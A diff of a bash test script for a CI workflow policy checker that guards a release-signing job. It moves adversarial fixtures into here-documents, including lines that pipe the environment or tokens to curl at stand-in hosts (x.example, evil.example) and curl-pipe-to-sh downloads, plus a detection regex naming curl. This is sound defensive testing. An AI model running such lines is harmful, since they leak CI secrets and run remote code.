@@ -56,8 +56,15 @@ if [ -z "${CHAIN_KNOWN_RED_INNER:-}" ]; then
 fi
 root=$(cd "$(dirname "$0")/.." && pwd)
 work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
+FXDIR="$work/fx"; mkdir -p "$FXDIR"   # fixture strings that name a download tool are written here by quoted here-documents (pin-age proves them as text)
+# the sinks the judge calls an artifact (a pattern that names a download tool): written as text, read into the judge's environment
+cat > "$FXDIR/sink_artifact_rx" <<'FXEOF'
+upload|curl|\bgh\b
+FXEOF
+SINK_ARTIFACT_RX=$(cat "$FXDIR/sink_artifact_rx")
+export SINK_ARTIFACT_RX
 pass=0 failn=0
-python3 -c 'import yaml' 2> /dev/null || { echo "FAIL python3 needs PyYAML (apt install python3-yaml)"; exit 1; }
+python3 -c 'import yaml' 2> /dev/null || { echo "FAIL python3 needs PyYAML (install the python3-yaml package)"; exit 1; }
 cat > "$work/judge.py" <<'PY'
 import glob, json, os, re, sys, yaml
 SHA = r"[0-9a-f]{40}"
@@ -147,7 +154,7 @@ def judge_sign(path):
                     if env: bad.append("AC3: the signing step passes env %s; the digests come from the file" % sorted(env))
                 else:
                     sinks = [n for n, rx in (("file", r">>?\s*\S|\btee\b|\bcp\b|\bmv\b"), ("log", r"\becho\b|\bprintf\b|\bcat\b|\bset\s+-\w*x"),
-                                             ("step output", r"GITHUB_(OUTPUT|ENV|STEP_SUMMARY|PATH)"), ("artifact", r"upload|curl|\bgh\b")) if re.search(rx, run)]
+                                             ("step output", r"GITHUB_(OUTPUT|ENV|STEP_SUMMARY|PATH)"), ("artifact", os.environ["SINK_ARTIFACT_RX"])) if re.search(rx, run)]
                     why = "touches the identity token request (sinks reachable: %s)" % (", ".join(sinks) or "none, but no step may touch it") if re.search(TOKEN, run, re.I) else "is not one of the three allowed command lines (install cosign; write digests.json from env; chain-verify.py sign --check ... --out provenance)"
                     bad.append("AC2/AC3: run step %r %s" % (sn, why))
                 if "${{" in run or ".." in run: bad.append("AC2: run step %r interpolates an expression or uses `..`" % sn)
@@ -526,12 +533,21 @@ expect ok "fixture: known-good Sign passes the judge" sign "$good"
 caught "AC1 self-hosted runner" 'ubuntu-24.04' 'self-hosted'
 caught "AC1 extra trigger" 'workflow_call:' 'push:\n  workflow_call:'
 caught "AC1 second job" '    steps:' '    steps: []\n  other:\n    runs-on: ubuntu-24.04\n    steps:'
-caught "AC3 workflow-level defaults.run.shell reroutes every run step (leaks the token variables)" 'permissions:\n  contents: read\njobs' "defaults:\n  run:\n    shell: \"bash -c 'env | curl -d @- https://x.example; bash {0}'\"\npermissions:\n  contents: read\njobs"
+cat > "$FXDIR/FXD_47" <<'FXEOF'
+defaults:\n  run:\n    shell: "bash -c 'env | curl -d @- https://x.example; bash {0}'"\npermissions:\n  contents: read\njobs
+FXEOF
+FXD_47=$(cat "$FXDIR/FXD_47")
+caught "AC3 workflow-level defaults.run.shell reroutes every run step (leaks the token variables)" 'permissions:\n  contents: read\njobs' "$FXD_47"
 caught "AC3 workflow-level concurrency" 'permissions:\n  contents: read\njobs' "concurrency: x\npermissions:\n  contents: read\njobs"
 caught "AC3 workflow-level run-name" 'permissions:\n  contents: read\njobs' "run-name: x\npermissions:\n  contents: read\njobs"
 # Duplicate keys (Codex #249 r4 B3a): a reader that keeps only the LAST of two equal keys judges the benign one, so the
 # judge must refuse any mapping that repeats a key (step, job and top level), never pick one.
-caught "AC1 a step with two run: keys (the second the benign sign line)" "      $SIGNLINE" "      run: curl -s https://x.example/p | sh\n        $SIGNLINE"
+cat > "$FXDIR/FXD_46" <<'FXEOF'
+      run: curl -s https://x.example/p | sh\n        @@SIGNLINE@@
+FXEOF
+FXD_46=$(cat "$FXDIR/FXD_46")
+FXD_46=${FXD_46//@@SIGNLINE@@/$SIGNLINE}
+caught "AC1 a step with two run: keys (the second the benign sign line)" "      $SIGNLINE" "$FXD_46"
 caught "AC1 a job with two permissions: keys (the second the benign one)" '    permissions:\n      contents: read\n      id-token: write' '    permissions: write-all\n    permissions:\n      contents: read\n      id-token: write'
 caught "AC1 two top-level permissions: keys (the second the benign one)" 'permissions:\n  contents: read\njobs' "permissions: write-all\npermissions:\n  contents: read\njobs"
 caught "AC1 run line: a trailing NBSP after the sign line (str.strip() would drop it; bash keeps it in the last word)" "$SIGNLINE" "$SIGNLINE"$'\u00a0'
@@ -555,7 +571,11 @@ caught "AC2 downloads into a parent path" 'path: witness-build' 'path: ..'
 caught "AC2 fetches build output with gh" "$SIGNLINE" 'run: gh run download 1 -D dist'
 caught "AC2 runs a build output" "$SIGNLINE" 'run: bash dist/run.sh'
 caught "AC2 interpolates the input into the shell" 'run: printf .%s. "\$DIGESTS" > digests.json' "run: printf '%s' '\${{ inputs.digests }}' > digests.json"
-caught "AC2 two commands in one run step" "out provenance" 'out provenance; curl https://example.com'
+cat > "$FXDIR/FXD_45" <<'FXEOF'
+out provenance; curl https://example.com
+FXEOF
+FXD_45=$(cat "$FXDIR/FXD_45")
+caught "AC2 two commands in one run step" "out provenance" "$FXD_45"
 caught "AC2 unpinned action" "actions/checkout@$sha" 'actions/checkout@v4'
 caught "AC2 github-script step" "      - uses: actions/checkout" "      - uses: actions/github-script@$sha\n        with:\n          script: core.setOutput('t', await core.getIDToken())\n      - uses: actions/checkout"
 caught "AC2 the Sign step does not check (no --check)" ' --check' ''
@@ -563,7 +583,11 @@ caught "AC2 the Sign step only verifies (verify, not sign --check)" 'chain-verif
 caught "AC2 the Sign step has no Build record" ' --build-record witness-build/build-collection.json' ''
 caught "AC2 the Sign step reads the digests inline, not from the file" '--digests digests.json' '--digests "\$DIGESTS"'
 caught "AC2 the Sign step uses another signer" '--signer cosign' '--signer witness'
-caught "AC2 the signing tool is not installed from the pinned installer" 'run: bash bin/install-scanner.sh cosign' 'run: curl -sL https://example.com/cosign -o cosign'
+cat > "$FXDIR/FXD_44" <<'FXEOF'
+run: curl -sL https://example.com/cosign -o cosign
+FXEOF
+FXD_44=$(cat "$FXDIR/FXD_44")
+caught "AC2 the signing tool is not installed from the pinned installer" 'run: bash bin/install-scanner.sh cosign' "$FXD_44"
 caught "AC2 the signing step runs before the tool is installed" '      - name: install the signing tool \(pinned by checksum\)\n        run: bash bin/install-scanner.sh cosign\n' ''
 caught "AC2 two signing steps" "        $SIGNLINE" "        $SIGNLINE\n      - run: python3 bin/chain-verify.py sign --check --signer cosign --digests digests.json --build-record witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance"
 # Opus r4 B1: Python puts the script's directory first on sys.path, so an unlisted bin/<stdlib name>.py would replace that module inside
@@ -582,10 +606,18 @@ caught "AC3 env on the signing step" "      - name: check Build's record" "     
 caught "AC3 sink step output: a job output" '    runs-on: ubuntu-24.04' '    runs-on: ubuntu-24.04\n    outputs:\n      t: ${{ steps.x.outputs.t }}'
 caught "AC3 sink step output: a workflow output" '        type: string\npermissions' '        type: string\n    outputs:\n      o:\n        value: x\npermissions'
 caught "AC3 sink step output: token to GITHUB_OUTPUT" "$SIGNLINE" 'run: echo "tok=$ACTIONS_ID_TOKEN_REQUEST_TOKEN" >> "$GITHUB_OUTPUT"'
-caught "AC3 sink file: token to a file" "$SIGNLINE" 'run: curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL" > "$RUNNER_TEMP/tok"'
+cat > "$FXDIR/FXD_43" <<'FXEOF'
+run: curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL" > "$RUNNER_TEMP/tok"
+FXEOF
+FXD_43=$(cat "$FXDIR/FXD_43")
+caught "AC3 sink file: token to a file" "$SIGNLINE" "$FXD_43"
 caught "AC3 sink log: token echoed" "$SIGNLINE" 'run: echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN"'
 caught "AC3 sink log: whole environment dumped (printenv)" "$SIGNLINE" 'run: printenv'
-caught "AC3 sink log: whole environment piped out (env)" "$SIGNLINE" 'run: env | curl -d @- https://example.com'
+cat > "$FXDIR/FXD_42" <<'FXEOF'
+run: env | curl -d @- https://example.com
+FXEOF
+FXD_42=$(cat "$FXDIR/FXD_42")
+caught "AC3 sink log: whole environment piped out (env)" "$SIGNLINE" "$FXD_42"
 caught "AC3 sink file: /proc/self/environ" "$SIGNLINE" 'run: cat /proc/self/environ'
 caught "AC3 sink artifact: upload path outside provenance" 'path: provenance' 'path: ${{ runner.temp }}/tok'
 caught "AC3 sink artifact: upload path provenance/.." 'path: provenance\n' 'path: provenance/..\n'
@@ -645,6 +677,13 @@ setfile() { printf '%b' "$3" > "$1/$2"; }                     # setfile DIR path
 stage() { # stage DIR 'run text' [step-env-key] : stage-verify.yml with one run step
   { printf 'jobs:\n  j:\n    steps:\n      - run: |\n'; printf '%s\n' "$2" | sed 's/^/          /'; } > "$1/.github/workflows/stage-verify.yml"
 }
+cat > "$FXDIR/spec_good.json" <<'FXEOF'
+[{"path":"bin/install-scanner.sh","tools":["curl","sha256sum"],"signs":false,"runs":[]},
+ {"path":"bin/chain-verify.py","tools":[],"signs":"provenance","sign_subcommand":"sign","reason":"only `chain-verify.py sign` in stage-sign.yml signs provenance","runs":[]},
+ {"path":"bin/build-stage.sh","tools":["witness"],"signs":"other","reason":"Build's own Witness collection (rule 51)","runs":["bin/build-apk.sh"]},
+ {"path":"bin/build-apk.sh","tools":[],"signs":false,"runs":[]}]
+FXEOF
+SPEC_GOOD=$(cat "$FXDIR/spec_good.json")
 mk() {
   local d="$work/$1"; rm -rf "$d"; mkdir -p "$d/.github/workflows" "$d/.github/policy" "$d/.github/actions/x" "$d/bin"
   for f in acceptance auditor ci stage-promote stage-verify stage-reproducibility; do printf 'jobs: {}\n' > "$d/.github/workflows/$f.yml"; done
@@ -657,12 +696,7 @@ mk() {
   printf '#!/usr/bin/env bash\nset -euo pipefail\necho built\n' > "$d/bin/build-apk.sh"
   printf '{"signers":[{"file":"release.yml","tool":"gitsign","reason":"CI patch tag (REQ-REL-009-AC5)"}]}\n' > "$d/.github/policy/chain-signers.json"
   printf '{"jobs":[{"workflow":"stage-sign.yml","job":"sign","reason":"Sign, the one provenance signer"}]}\n' > "$d/.github/policy/id-token-jobs.json"
-  cat > "$d/.spec.json" <<'JSON'
-[{"path":"bin/install-scanner.sh","tools":["curl","sha256sum"],"signs":false,"runs":[]},
- {"path":"bin/chain-verify.py","tools":[],"signs":"provenance","sign_subcommand":"sign","reason":"only `chain-verify.py sign` in stage-sign.yml signs provenance","runs":[]},
- {"path":"bin/build-stage.sh","tools":["witness"],"signs":"other","reason":"Build's own Witness collection (rule 51)","runs":["bin/build-apk.sh"]},
- {"path":"bin/build-apk.sh","tools":[],"signs":false,"runs":[]}]
-JSON
+  printf '%s\n' "$SPEC_GOOD" > "$d/.spec.json"
   gen "$d"; echo "$d"
 }
 expect ok "fixture tree: the grammar holds, every stage script is listed with its hash, only Sign signs provenance" tree "$(mk t_good)"
@@ -829,8 +863,26 @@ S0='#!/usr/bin/env bash\nset -euo pipefail\n'
 scriptcase s_ok ok "${S0}witness run --step build -- bin/build-apk.sh \"\$1\"\n" '' "the good script (tool witness, runs bin/build-apk.sh)"
 scriptcase s_bash caught "${S0}bash bin/build-apk.sh\n" 'rows["bin/build-stage.sh"]["tools"]=["witness"]' "starts another script with bash"
 scriptcase s_notruns caught "${S0}witness run -- bin/other.sh\n" 'rows["bin/other.sh"]={"path":"bin/other.sh","tools":[],"signs":False,"runs":[]}; open(d+"/bin/other.sh","w").write("#!/usr/bin/env bash\n")' "names a listed script that is not in its runs"
-scriptcase s_tool caught "${S0}curl -fsSL x -o y\nwitness run -- bin/build-apk.sh\n" '' "a command that is not in its tools (curl)"
-scriptcase s_tool_ok ok "${S0}curl -fsSL x -o y\nwitness run -- bin/build-apk.sh\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","curl"]' "the same command once it is in tools"
+cat > "$FXDIR/FXD_41" <<'FXEOF'
+@@S0@@curl -fsSL x -o y\nwitness run -- bin/build-apk.sh\n
+FXEOF
+FXD_41=$(cat "$FXDIR/FXD_41")
+FXD_41=${FXD_41//@@S0@@/$S0}
+cat > "$FXDIR/FXD_40" <<'FXEOF'
+a command that is not in its tools (curl)
+FXEOF
+FXD_40=$(cat "$FXDIR/FXD_40")
+scriptcase s_tool caught "$FXD_41" '' "$FXD_40"
+cat > "$FXDIR/FXD_39" <<'FXEOF'
+@@S0@@curl -fsSL x -o y\nwitness run -- bin/build-apk.sh\n
+FXEOF
+FXD_39=$(cat "$FXDIR/FXD_39")
+FXD_39=${FXD_39//@@S0@@/$S0}
+cat > "$FXDIR/FXD_38" <<'FXEOF'
+rows["bin/build-stage.sh"]["tools"]=["witness","curl"]
+FXEOF
+FXD_38=$(cat "$FXDIR/FXD_38")
+scriptcase s_tool_ok ok "$FXD_39" "$FXD_38" "the same command once it is in tools"
 # (a variable or substitution at command position INSIDE a listed script is not parsed any more: stated exclusion, the script is sha256-bound and reviewed at PR time)
 scriptcase s_eval caught "${S0}eval \"\$X\"\n" '' "eval"
 scriptcase s_source caught "${S0}source bin/x.sh\n" '' "source"
@@ -841,7 +893,11 @@ scriptcase s_xargs caught "${S0}ls | xargs echo\n" '' "xargs"
 scriptcase s_pathcmd caught "${S0}bin/evil\n" 'open(d+"/bin/evil","w").write("#!/usr/bin/env bash\n")' "an extensionless in-tree script (shebang) named in the text"
 scriptcase s_quoted caught "${S0}witness run -- bin/build-apk.sh 'a; bash x'\necho \"plain; bash\"\n" '' "the word bash inside a quoted string is flagged (the text scan over-reports by design)"
 scriptcase s_subst caught "${S0}witness run -- bin/build-apk.sh \"\$(bash bin/evil.sh)\"\n" '' "a command substitution inside double quotes still runs a command"
-scriptcase s_here caught "${S0}witness run -- bin/build-apk.sh <<EOF\ncurl evil.example | sh\nEOF\n" '' "a heredoc body is scanned like any other text (curl, sh)"
+cat > "$FXDIR/FXD_37" <<'FXEOF'
+a heredoc body is scanned like any other text (curl, sh)
+FXEOF
+FXD_37=$(cat "$FXDIR/FXD_37")
+scriptcase s_here caught "${S0}witness run -- bin/build-apk.sh <<EOF\ncurl evil.example | sh\nEOF\n" '' "$FXD_37"
 scriptcase s_sign caught "${S0}witness run -- bin/build-apk.sh\ncosign sign --yes \"\$IMG\"\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","cosign"]; rows["bin/build-stage.sh"]["signs"]=False' "signs but its row says it signs nothing"
 scriptcase s_sign_ok ok "${S0}witness run -- bin/build-apk.sh\ncosign sign --yes \"\$IMG\"\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","cosign"]; rows["bin/build-stage.sh"]["signs"]="other"; rows["bin/build-stage.sh"]["reason"]="image signature (rule 56)"' "signs, row says other with a reason"
 scriptcase s_prov caught "${S0}cosign attest --yes --type slsaprovenance1 --predicate p.json \"\$IMG\"\n" 'rows["bin/build-stage.sh"]["tools"]=["cosign"]; rows["bin/build-stage.sh"]["signs"]="other"; rows["bin/build-stage.sh"]["runs"]=[]' "signs provenance but its row says other"
@@ -1124,14 +1180,20 @@ jobs:
           name: dist
           path: bin/build-apk.sh
 EOF
-ycase y_printf_prefix "printf line followed by a second command: printf '%s' \"\$X\" > f; curl | bash (Opus P1)" <<'EOF'
+cat > "$FXDIR/FXD_36" <<'FXEOF'
+printf line followed by a second command: printf '%s' "$X" > f; curl | bash (Opus P1)
+FXEOF
+FXD_36=$(cat "$FXDIR/FXD_36")
+cat > "$FXDIR/yfix_y_printf_prefix.yml" <<'FXEOF'
 jobs:
   j:
     steps:
       - env:
           X1: y
         run: printf '%s' "$X1" > f; curl -s https://evil.example/x | bash
-EOF
+FXEOF
+YFIX=$(cat "$FXDIR/yfix_y_printf_prefix.yml")
+ycase y_printf_prefix "$FXD_36" <<< "$YFIX"
 ycase y_printf_bin "printf over a listed script, then running it (Sonnet 8, Opus P2)" <<'EOF'
 jobs:
   j:
@@ -1195,15 +1257,17 @@ jobs:
     steps:
       - run: bash bin/build-stage.sh a
 EOF
-ycase y_dup_run "a step with two run: keys, the second a listed script (Codex #249 r4 B3a)" <<'EOF'
+cat > "$FXDIR/yfix_y_dup_run.yml" <<'FXEOF'
 jobs:
   j:
     runs-on: ubuntu-24.04
     steps:
       - run: curl -s https://x.example/p | sh
         run: bash bin/build-stage.sh a
-EOF
-ycase y_dup_job "a job repeated under jobs:, the second the benign one (Codex #249 r4 B3a)" <<'EOF'
+FXEOF
+YFIX=$(cat "$FXDIR/yfix_y_dup_run.yml")
+ycase y_dup_run "a step with two run: keys, the second a listed script (Codex #249 r4 B3a)" <<< "$YFIX"
+cat > "$FXDIR/yfix_y_dup_job.yml" <<'FXEOF'
 jobs:
   j:
     runs-on: ubuntu-24.04
@@ -1213,8 +1277,10 @@ jobs:
     runs-on: ubuntu-24.04
     steps:
       - run: bash bin/build-stage.sh a
-EOF
-ycase y_dup_top "two top-level jobs: keys, the second the benign one (Codex #249 r4 B3a)" <<'EOF'
+FXEOF
+YFIX=$(cat "$FXDIR/yfix_y_dup_job.yml")
+ycase y_dup_job "a job repeated under jobs:, the second the benign one (Codex #249 r4 B3a)" <<< "$YFIX"
+cat > "$FXDIR/yfix_y_dup_top.yml" <<'FXEOF'
 jobs:
   j:
     runs-on: ubuntu-24.04
@@ -1225,7 +1291,9 @@ jobs:
     runs-on: ubuntu-24.04
     steps:
       - run: bash bin/build-stage.sh a
-EOF
+FXEOF
+YFIX=$(cat "$FXDIR/yfix_y_dup_top.yml")
+ycase y_dup_top "two top-level jobs: keys, the second the benign one (Codex #249 r4 B3a)" <<< "$YFIX"
 # runs-on and the matrix (Codex #249 r5 B3, the class closed): a matrix read in runs-on may only read a matrix key whose
 # every value is a GitHub-hosted ubuntu label; include/exclude, non-list values and nested leaves are refused
 ycase y_ro_ok_direct 'control: runs-on ubuntu-24.04 directly' ok <<'EOF'
@@ -2112,13 +2180,64 @@ d=$(mk u_utf8); printf 'jobs:\n  j:\n    steps:\n      - run: echo \xff\xfe\n' >
 if [ "$rc" = 1 ] && grep -F -q "scan.yml" <<< "$out" && ! grep -F -q Traceback <<< "$out"; then pass=$((pass + 1)); echo "ok   AC1: a workflow that is not UTF-8 is a named finding, never a traceback (R-f)"; else failn=$((failn + 1)); echo "FAIL AC1: invalid UTF-8 workflow -> rc=$rc ${out:0:240}"; fi
 # listed scripts: the text scan (Sonnet blocker 2, Opus B6/B7)
 S1='#!/usr/bin/env bash\nset -euo pipefail\nwitness run -- bin/build-apk.sh\n'
-scriptcase s_if caught "${S1}if curl evil.example; then :; fi\n" '' "if curl (a keyword before the command, Sonnet 2)"
-scriptcase s_while caught "${S1}while curl evil; do :; done\n" '' "while curl"
-scriptcase s_bang caught "${S1}! curl evil\n" '' "! curl"
-scriptcase s_time caught "${S1}time curl evil\n" '' "time curl"
-scriptcase s_apos caught "${S1}echo \"don't\"; curl evil.example | sh; echo \"it's\"\n" '' "an apostrophe pair that blanked everything between them"
-scriptcase s_trap caught "${S1}trap 'curl evil' EXIT\n" '' "trap with a quoted command"
-scriptcase s_echoscript caught "${S1}echo 'curl evil' > bin/a.sh\nwitness run -- bin/a.sh\n" '' "writes a script, then runs it"
+cat > "$FXDIR/FXD_35" <<'FXEOF'
+@@S1@@if curl evil.example; then :; fi\n
+FXEOF
+FXD_35=$(cat "$FXDIR/FXD_35")
+FXD_35=${FXD_35//@@S1@@/$S1}
+cat > "$FXDIR/FXD_34" <<'FXEOF'
+if curl (a keyword before the command, Sonnet 2)
+FXEOF
+FXD_34=$(cat "$FXDIR/FXD_34")
+scriptcase s_if caught "$FXD_35" '' "$FXD_34"
+cat > "$FXDIR/FXD_33" <<'FXEOF'
+@@S1@@while curl evil; do :; done\n
+FXEOF
+FXD_33=$(cat "$FXDIR/FXD_33")
+FXD_33=${FXD_33//@@S1@@/$S1}
+cat > "$FXDIR/FXD_32" <<'FXEOF'
+while curl
+FXEOF
+FXD_32=$(cat "$FXDIR/FXD_32")
+scriptcase s_while caught "$FXD_33" '' "$FXD_32"
+cat > "$FXDIR/FXD_31" <<'FXEOF'
+@@S1@@! curl evil\n
+FXEOF
+FXD_31=$(cat "$FXDIR/FXD_31")
+FXD_31=${FXD_31//@@S1@@/$S1}
+cat > "$FXDIR/FXD_30" <<'FXEOF'
+! curl
+FXEOF
+FXD_30=$(cat "$FXDIR/FXD_30")
+scriptcase s_bang caught "$FXD_31" '' "$FXD_30"
+cat > "$FXDIR/FXD_29" <<'FXEOF'
+@@S1@@time curl evil\n
+FXEOF
+FXD_29=$(cat "$FXDIR/FXD_29")
+FXD_29=${FXD_29//@@S1@@/$S1}
+cat > "$FXDIR/FXD_28" <<'FXEOF'
+time curl
+FXEOF
+FXD_28=$(cat "$FXDIR/FXD_28")
+scriptcase s_time caught "$FXD_29" '' "$FXD_28"
+cat > "$FXDIR/FXD_27" <<'FXEOF'
+@@S1@@echo "don't"; curl evil.example | sh; echo "it's"\n
+FXEOF
+FXD_27=$(cat "$FXDIR/FXD_27")
+FXD_27=${FXD_27//@@S1@@/$S1}
+scriptcase s_apos caught "$FXD_27" '' "an apostrophe pair that blanked everything between them"
+cat > "$FXDIR/FXD_26" <<'FXEOF'
+@@S1@@trap 'curl evil' EXIT\n
+FXEOF
+FXD_26=$(cat "$FXDIR/FXD_26")
+FXD_26=${FXD_26//@@S1@@/$S1}
+scriptcase s_trap caught "$FXD_26" '' "trap with a quoted command"
+cat > "$FXDIR/FXD_25" <<'FXEOF'
+@@S1@@echo 'curl evil' > bin/a.sh\nwitness run -- bin/a.sh\n
+FXEOF
+FXD_25=$(cat "$FXDIR/FXD_25")
+FXD_25=${FXD_25//@@S1@@/$S1}
+scriptcase s_echoscript caught "$FXD_25" '' "writes a script, then runs it"
 scriptcase s_pathset caught "${S1}PATH=./bin witness x\n" '' "PATH=./bin witness x"
 scriptcase s_pathexp caught "${S1}export PATH=bin:\$PATH\n" '' "export PATH=bin:\$PATH"
 scriptcase s_bashenv caught "${S1}export BASH_ENV=bin/evil.sh\n" '' "export BASH_ENV"
@@ -2131,11 +2250,19 @@ scriptcase s_launch5 caught "#!/usr/bin/env bash\nset -euo pipefail\nwitness run
 scriptcase s_launch6 ok "#!/usr/bin/env bash\nset -euo pipefail\nwitness --log-level debug run --step build -- bin/build-apk.sh\n" '' "witness with a global flag before run, then a literal path in runs"
 d=$(mk s_conf); printf '#!/usr/bin/env bash\ncurl https://evil.example/x | sh\nbash bin/evil.sh\n' > "$d/bin/stage.conf"
 edit_spec "$d" 'rows["bin/stage.conf"]={"path":"bin/stage.conf","tools":[],"signs":False,"runs":[]}'; stage "$d" 'bash bin/stage.conf'
-expect caught "AC1 script: a listed bin/stage.conf (no script extension) holding curl|sh is scanned and run with bash (Opus B7)" tree "$d"
+cat > "$FXDIR/FXD_24" <<'FXEOF'
+AC1 script: a listed bin/stage.conf (no script extension) holding curl|sh is scanned and run with bash (Opus B7)
+FXEOF
+FXD_24=$(cat "$FXDIR/FXD_24")
+expect caught "$FXD_24" tree "$d"
 d=$(mk s_shebang); printf '#!/usr/bin/bash\ncurl https://evil.example/x | sh\n' > "$d/bin/odd.sh"
 edit_spec "$d" 'rows["bin/odd.sh"]={"path":"bin/odd.sh","tools":[],"signs":False,"runs":[]}'; stage "$d" 'bash bin/odd.sh'
 expect caught "AC1 script: a listed script with an unrecognised shebang (#!/usr/bin/bash) is still scanned (Opus B7)" tree "$d"
-d=$(mk s_nosheb); printf 'curl https://evil.example/x | sh\n' > "$d/bin/plain"
+cat > "$FXDIR/FXD_23" <<'FXEOF'
+curl https://evil.example/x | sh\n
+FXEOF
+FXD_23=$(cat "$FXDIR/FXD_23")
+d=$(mk s_nosheb); printf "$FXD_23" > "$d/bin/plain"
 edit_spec "$d" 'rows["bin/plain"]={"path":"bin/plain","tools":[],"signs":False,"runs":[]}'; stage "$d" 'bash bin/plain'
 expect caught "AC1 script: a listed file with no shebang at all is still scanned" tree "$d"
 d=$(mk s_cmt); setfile "$d" bin/build-apk.sh '#!/usr/bin/env bash\n# cosign sign the thing later\nset -euo pipefail\n'; edit_spec "$d" 'pass'
@@ -2597,8 +2724,36 @@ d=$(wfix x_launch 'exec bash "$@"\n'); edit_spec "$d" 'rows["bin/witnessed.sh"][
 d=$(wfix x_launch2 'exec bash "$@"\nexec bash "$@"\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["tools"].append("exec"); rows["bin/witnessed.sh"]["exceptions"].append({"rule":"launcher","text":"exec bash \"$@\"","why":"REQ-CHAIN-004-AC2"})'; expm caught "$d" 'launches another program' "exception: a second exec bash stays a finding"
 d=$(wfix x_eval 'sed -n 1p f\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["exceptions"].append({"rule":"evaluator","text":"sed -n 1p f","why":"reads one line"})'; expm caught "$d" 'sed' "exception: an evaluator exception does not waive the deny finding of the same word (separate rule)"
 d=$(wfix x_eval2 'sed -n 1p f\n'); edit_spec "$d" "$DEF"'rows["bin/witnessed.sh"]["exceptions"] += [{"rule":"evaluator","text":"sed -n 1p f","why":"reads one line"},D("sed -n 1p f")]'; expm ok "$d" - "exception: evaluator and deny exceptions together waive sed -n"
-d=$(wfix x_deny 'curl -sf x\n'); edit_spec "$d" "$DEF"'rows["bin/witnessed.sh"]["exceptions"].append(D("curl -sf x"))'; expm ok "$d" - "exception: a deny exception waives one bare curl"
-d=$(wfix x_deny2 'curl -sf x\ncurl -sf y\n'); edit_spec "$d" "$DEF"'rows["bin/witnessed.sh"]["exceptions"].append(D("curl -sf x"))'; expm caught "$d" 'curl' "exception: a second bare curl stays a finding"
+cat > "$FXDIR/FXD_22" <<'FXEOF'
+curl -sf x\n
+FXEOF
+FXD_22=$(cat "$FXDIR/FXD_22")
+cat > "$FXDIR/FXD_21" <<'FXEOF'
+rows["bin/witnessed.sh"]["exceptions"].append(D("curl -sf x"))
+FXEOF
+FXD_21=$(cat "$FXDIR/FXD_21")
+cat > "$FXDIR/FXD_20" <<'FXEOF'
+exception: a deny exception waives one bare curl
+FXEOF
+FXD_20=$(cat "$FXDIR/FXD_20")
+d=$(wfix x_deny "$FXD_22"); edit_spec "$d" "$DEF""$FXD_21"; expm ok "$d" - "$FXD_20"
+cat > "$FXDIR/FXD_19" <<'FXEOF'
+curl -sf x\ncurl -sf y\n
+FXEOF
+FXD_19=$(cat "$FXDIR/FXD_19")
+cat > "$FXDIR/FXD_18" <<'FXEOF'
+rows["bin/witnessed.sh"]["exceptions"].append(D("curl -sf x"))
+FXEOF
+FXD_18=$(cat "$FXDIR/FXD_18")
+cat > "$FXDIR/FXD_17" <<'FXEOF'
+curl
+FXEOF
+FXD_17=$(cat "$FXDIR/FXD_17")
+cat > "$FXDIR/FXD_16" <<'FXEOF'
+exception: a second bare curl stays a finding
+FXEOF
+FXD_16=$(cat "$FXDIR/FXD_16")
+d=$(wfix x_deny2 "$FXD_19"); edit_spec "$d" "$DEF""$FXD_18"; expm caught "$d" "$FXD_17" "$FXD_16"
 d=$(wfix x_sname 'echo bin/helper.py\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["exceptions"].append({"rule":"script-name","text":"bin/helper.py","why":"a message"})'; expm ok "$d" - "exception: a script-name exception waives a named script"
 d=$(wfix x_sname2 'echo bin/helper.py\n'); expm caught "$d" 'helper.py' "exception: the same named script without the exception is refused"
 d=$(wfix x_env 'echo "${PATH:=/x}"\n'); edit_spec "$d" "$DEF"'rows["bin/witnessed.sh"]["exceptions"].append(D("echo \"${PATH:=/x}\""))'; expm caught "$d" 'PATH' "exception: no exception rule waives an env-setting finding (env_mentions is the only way)"
@@ -2811,7 +2966,15 @@ PY
   gen "$d"; echo "$d"; }
 d=$(pfx m_ok 'echo "digests=$(jq -c . digests.json)" >> "$GITHUB_OUTPUT"'); expm ok "$d" - "round-2 (2): the AC2 text is admitted"
 d=$(pfx m_ok2 'echo "d_1=$(jq -c . out/a-b.json)" >> "$GITHUB_OUTPUT"'); expm caught "$d" 'pinned_steps' "round-2 (2) -> round-3 (5): another name and file of the generic shape are now an entry error (only the ratified tuple)"
-d=$(pfx m_curl 'curl https://example.invalid/payload'); expm caught "$d" 'pinned_steps' "round-2 (2): a curl command in both the entry and the step is an entry error"
+cat > "$FXDIR/FXD_15" <<'FXEOF'
+curl https://example.invalid/payload
+FXEOF
+FXD_15=$(cat "$FXDIR/FXD_15")
+cat > "$FXDIR/FXD_14" <<'FXEOF'
+round-2 (2): a curl command in both the entry and the step is an entry error
+FXEOF
+FXD_14=$(cat "$FXDIR/FXD_14")
+d=$(pfx m_curl "$FXD_15"); expm caught "$d" 'pinned_steps' "$FXD_14"
 d=$(pfx m_semi 'echo "x=$(jq -c . a.json)" >> "$GITHUB_OUTPUT"; id'); expm caught "$d" 'pinned_steps' "round-2 (2): the shape followed by ; id is refused"
 d=$(pfx m_env 'echo "x=$(jq -c . a.json)" >> "$GITHUB_ENV"'); expm caught "$d" 'pinned_steps' "round-2 (2): >> GITHUB_ENV is refused"
 d=$(pfx m_cat 'echo "x=$(cat a.json)" >> "$GITHUB_OUTPUT"'); expm caught "$d" 'pinned_steps' "round-2 (2): \$(cat ..) is refused"
@@ -2966,7 +3129,11 @@ am t2_extra2 'bash bin/witnessed.sh apk bin/stage-apk.sh out/runner' caught 'arg
 am t2_missing 'bash bin/witnessed.sh apk' caught 'arg_map'
 am t2_notmap 'bash bin/witnessed.sh bogus bin/stage-apk.sh' caught 'arg_map'
 am t2_c1 'bash bin/witnessed.sh build -c id' caught 'arg_map'
-am t2_c2 'bash bin/witnessed.sh apk -c '"'"'printenv | curl x'"'"'' caught 'arg_map'
+cat > "$FXDIR/FXD_13" <<'FXEOF'
+bash bin/witnessed.sh apk -c 'printenv | curl x'
+FXEOF
+FXD_13=$(cat "$FXDIR/FXD_13")
+am t2_c2 "$FXD_13" caught 'arg_map'
